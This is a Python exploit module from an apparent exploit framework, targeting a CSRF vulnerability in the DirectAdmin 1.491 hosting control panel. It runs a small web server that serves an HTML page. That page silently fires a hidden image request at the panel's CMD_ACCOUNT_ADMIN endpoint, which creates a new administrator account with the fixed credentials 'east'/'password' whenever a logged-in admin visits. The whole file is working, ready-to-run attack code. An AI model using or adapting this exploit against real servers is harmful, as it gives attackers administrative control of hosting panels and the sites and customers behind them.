#!/usr/bin/env python

import sys
import re
import os
import socket

sys.path.append("./core")
from Sploit import Sploit

INFO={}
INFO['NAME']="efs_DirectAdmin_CSRF"
INFO['DESCRIPTION']="DirectAdmin (1.491) CSRF Vulnerability"
INFO['VENDOR']="http://www.directadmin.com/"
INFO["CVE Name"]="N/A"
INFO["NOTES"]="""
DirectAdmin is a web-based hosting control panel.
Original form doesn't include csrf protection or any secret token.
More information https://www.exploit-db.com/exploits/39469/
This POC create user with login: east
and password: password
"""
INFO['CHANGELOG']="19 Feb, 2016. Written by Gleg team."
INFO['PATH'] = "Exploits/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = "2222"
OPTIONS["LOGIN"] = "east"
OPTIONS["PASSWORD"] = "password"
OPTIONS["LISTEN PORT"] = 8089
EXPLOIT_HTML = """<html>
<head>
<title>POC</title>
</head>
<script language="javascript">
 
function yurudi(){
var adress  ="__HOST__";
var username="__LOGIN__";
var email   ="demo@demo.com";
var password="__PASSWORD__";
var urlson="https://"+adress+":__PORT__/CMD_ACCOUNT_ADMIN?action=create&username="+username+"&email="+email+"&passwd="+password+"&passwd2="+password;
 
document.getElementById("resim").src=urlson;
}
</script>
 
<body onload="yurudi()">
<img id="resim" src="" style="height:0px;width:0px;"></img>
</body>
</html>"""


class exploit(Sploit):
    def __init__(self,
                host="127.0.0.1",
                port="2222",
                login="east",
                password="password",
                listen_port = 8089,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.host = host
        self.port = port
        self.login = login
        self.password = password
        self.l_port = listen_port
        self.name = INFO['NAME']
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = self.args.get('PORT', self.port)
        self.login = self.args.get('LOGIN', self.login)
        self.password = self.args.get('PASSWORD', self.password)
        self.l_port = int(self.args.get('LISTEN PORT', self.l_port))
        return

    def run(self):
        self.args()
        ip_server = "0.0.0.0"
        crlf = "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server = (ip_server, self.l_port)
        s.bind(server)
        bad_html = """
        <html>
<head>
<title>POC</title>
</head>
<script language="javascript">
 
function yurudi(){
var adress  ="__HOST__";
var username="__LOGIN__";
var email   ="demo@demo.com";
var password="__PASSWORD__";
var urlson="https://"+adress+":__PORT__/CMD_ACCOUNT_ADMIN?action=create&username="+username+"&email="+email+"&passwd="+password+"&passwd2="+password;
 
document.getElementById("resim").src=urlson;
}
</script>
 
<body onload="yurudi()">
<img id="resim" src="" style="height:0px;width:0px;"></img>
</body>
</html>
        """
        self.log("waiting for request")
        bad_html = bad_html.replace('__HOST__', self.host)
        bad_html = bad_html.replace('__PORT__', self.port)
        bad_html = bad_html.replace('__LOGIN__', self.login)
        bad_html = bad_html.replace('__PASSWORD__', self.password)
        exploit = bad_html
        response = "HTTP/1.1 200 OK" + crlf
        response += "Content-Type: text/html" + crlf
        response += "Connection: close" + crlf
        response += "Server: Apache" + crlf
        response += "Content-Length: " + str(len(exploit))
        response += crlf + crlf + exploit + crlf
        back_ip = socket.gethostbyname(socket.gethostname())
        s.listen(1)
        connection, client_address = s.accept()
        while True:
            try:
                connection.recv(2048)
                self.log("Got request, sending payload")
                connection.send(response)
                self.log("exploit send")
                connection.close()
            except:                
                self.finish(True)
        return 1
if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
